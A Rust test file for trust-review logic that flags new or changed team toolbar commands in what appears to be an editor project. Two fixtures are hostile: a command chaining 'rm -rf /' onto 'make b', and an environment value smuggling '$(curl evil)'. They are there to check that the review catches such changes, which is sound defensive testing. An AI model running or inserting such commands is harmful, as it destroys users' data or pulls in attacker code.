use std::path::Path;

use super::*;
use crate::config::{ConfigSource, merge, parse_config};

fn buttons(team: &str, personal: Option<&str>) -> Vec<ToolbarButton> {
    let team = parse_config(team, ConfigSource::Team).unwrap();
    let personal = personal.map(|text| parse_config(text, ConfigSource::Personal).unwrap());
    merge(Some(&team), personal.as_ref()).unwrap()
}

#[test]
fn hash_changes_with_the_content() {
    let first = content_hash(b"[[button]]\nid = \"a\"\n");
    let second = content_hash(b"[[button]]\nid = \"b\"\n");

    assert!(first.starts_with("sha256:"));
    assert_eq!(first.len(), "sha256:".len() + 64);
    assert_ne!(first, second);
    assert_eq!(first, content_hash(b"[[button]]\nid = \"a\"\n"));
}

#[test]
fn trust_is_per_project_and_per_version() {
    let mut state = ToolbarUserState::default();
    let root = Path::new("/work/app");

    state.trust(root, "sha256:one", &[]);

    assert!(state.is_trusted(root, "sha256:one"));
    assert!(!state.is_trusted(root, "sha256:two"));
    assert!(!state.is_trusted(Path::new("/work/other"), "sha256:one"));
}

#[test]
fn trusting_a_new_version_replaces_the_old_one() {
    let mut state = ToolbarUserState::default();
    let root = Path::new("/work/app");

    state.trust(root, "sha256:one", &[]);
    state.trust(root, "sha256:two", &[]);

    assert!(!state.is_trusted(root, "sha256:one"));
    assert!(state.is_trusted(root, "sha256:two"));
}

#[test]
fn state_survives_a_json_round_trip() {
    let mut state = ToolbarUserState::default();
    state.trust(Path::new("/work/app"), "sha256:one", &[]);
    state.select_run_config(Path::new("/work/app"), "button:assemble");

    let restored = ToolbarUserState::from_json(&state.to_json());

    assert_eq!(restored, state);
    assert_eq!(
        restored.selected_run_config(Path::new("/work/app")),
        Some("button:assemble")
    );
}

#[test]
fn unreadable_state_trusts_nothing() {
    let state = ToolbarUserState::from_json("not json");

    assert_eq!(state, ToolbarUserState::default());
}

#[test]
fn team_command_needs_trust_until_its_file_version_is_trusted() {
    let root = Path::new("/work/app");
    let buttons = buttons("[[button]]\nid = \"b\"\ncommand = \"make\"\n", None);
    let mut state = ToolbarUserState::default();

    assert!(needs_trust(&buttons[0], root, Some("sha256:one"), &state));

    state.trust(root, "sha256:one", &[]);

    assert!(!needs_trust(&buttons[0], root, Some("sha256:one"), &state));
    assert!(needs_trust(
        &buttons[0],
        root,
        Some("sha256:changed"),
        &state
    ));
}

#[test]
fn team_command_without_a_hash_always_needs_trust() {
    let buttons = buttons("[[button]]\nid = \"b\"\ncommand = \"make\"\n", None);

    assert!(needs_trust(
        &buttons[0],
        Path::new("/work/app"),
        None,
        &ToolbarUserState::default()
    ));
}

#[test]
fn personal_commands_and_non_command_buttons_never_need_trust() {
    let buttons = buttons(
        "[[button]]\nid = \"b\"\ncommand = \"make\"\n[[button]]\nid = \"u\"\nurl = \"https://u\"\n",
        Some("[[button]]\nid = \"b\"\ncommand = \"make -j8\"\n"),
    );
    let state = ToolbarUserState::default();

    for button in &buttons {
        assert!(
            !needs_trust(button, Path::new("/work/app"), Some("sha256:one"), &state),
            "button {}",
            button.id
        );
    }
}

#[test]
fn first_review_lists_each_team_command_as_new_with_its_options() {
    let buttons = buttons(
        r#"
[[button]]
id = "assemble"
label = "Assemble"
command = "./gradlew assembleDebug"
[[button]]
id = "logcat"
command = "adb logcat"
target = "split_right"
cwd = "app"
env = { ANDROID_SERIAL = "emulator-5554", ADB_TRACE = "1" }
[[button]]
id = "ci"
url = "https://example.com"
"#,
        Some("[[button]]\nid = \"mine\"\ncommand = \"echo personal\"\n"),
    );

    let review = trust_review(&buttons, None);

    assert_eq!(
        review,
        TrustReview {
            listings: vec![
                TrustListing {
                    label: "Assemble".to_owned(),
                    command: "./gradlew assembleDebug".to_owned(),
                    details: "current session".to_owned(),
                    change: TrustChange::New,
                },
                TrustListing {
                    label: "logcat".to_owned(),
                    command: "adb logcat".to_owned(),
                    details: "split right · cwd app · env ADB_TRACE, ANDROID_SERIAL".to_owned(),
                    change: TrustChange::New,
                },
            ],
            is_update: false,
            removed: 0,
        }
    );
}

#[test]
fn review_after_a_change_lists_new_and_changed_commands_before_unchanged_ones() {
    let root = Path::new("/work/app");
    let trusted = buttons(
        "[[button]]\nid = \"a\"\ncommand = \"make a\"\n\
         [[button]]\nid = \"b\"\ncommand = \"make b\"\n\
         [[button]]\nid = \"c\"\ncommand = \"make c\"\n",
        None,
    );
    let mut state = ToolbarUserState::default();
    state.trust(root, "sha256:one", &trusted);
    let changed = buttons(
        "[[button]]\nid = \"a\"\ncommand = \"make a\"\n\
         [[button]]\nid = \"b\"\ncommand = \"make b && rm -rf /\"\n\
         [[button]]\nid = \"c\"\ncommand = \"make c\"\n\
         [[button]]\nid = \"d\"\ncommand = \"make d\"\n",
        None,
    );

    let review = trust_review(&changed, state.trusted_commands(root));

    let order = review
        .listings
        .iter()
        .map(|listing| (listing.command.as_str(), listing.change))
        .collect::<Vec<_>>();
    assert_eq!(
        order,
        vec![
            ("make d", TrustChange::New),
            ("make b && rm -rf /", TrustChange::Changed),
            ("make a", TrustChange::Unchanged),
            ("make c", TrustChange::Unchanged),
        ]
    );
    assert!(review.is_update);
    assert_eq!(review.removed, 0);
}

#[test]
fn changed_env_value_counts_as_a_change_although_only_names_are_shown() {
    let root = Path::new("/work/app");
    let mut state = ToolbarUserState::default();
    state.trust(
        root,
        "sha256:one",
        &buttons(
            "[[button]]\nid = \"a\"\ncommand = \"make\"\nenv = { MODE = \"debug\" }\n",
            None,
        ),
    );
    let changed = buttons(
        "[[button]]\nid = \"a\"\ncommand = \"make\"\nenv = { MODE = \"$(curl evil)\" }\n",
        None,
    );

    let review = trust_review(&changed, state.trusted_commands(root));

    assert_eq!(review.count(TrustChange::Changed), 1);
}

#[test]
fn review_counts_trusted_commands_that_were_removed() {
    let root = Path::new("/work/app");
    let mut state = ToolbarUserState::default();
    state.trust(
        root,
        "sha256:one",
        &buttons(
            "[[button]]\nid = \"a\"\ncommand = \"make a\"\n\
             [[button]]\nid = \"b\"\ncommand = \"make b\"\n",
            None,
        ),
    );
    let changed = buttons("[[button]]\nid = \"a\"\ncommand = \"make a\"\n", None);

    let review = trust_review(&changed, state.trusted_commands(root));

    assert_eq!(review.removed, 1);
    assert_eq!(review.count(TrustChange::Unchanged), 1);
}

#[test]
fn state_saved_before_command_signatures_has_no_previous_commands() {
    let state = ToolbarUserState::from_json(r#"{"trusted":{"/work/app":"sha256:one"}}"#);

    assert!(state.is_trusted(Path::new("/work/app"), "sha256:one"));
    assert_eq!(state.trusted_commands(Path::new("/work/app")), None);
}

#[test]
fn signatures_cover_only_team_commands() {
    let buttons = buttons(
        "[[button]]\nid = \"a\"\ncommand = \"make\"\n[[button]]\nid = \"u\"\nurl = \"https://u\"\n",
        Some("[[button]]\nid = \"mine\"\ncommand = \"echo\"\n"),
    );

    let signatures = command_signatures(&buttons);

    assert_eq!(signatures.keys().collect::<Vec<_>>(), vec!["a"]);
}
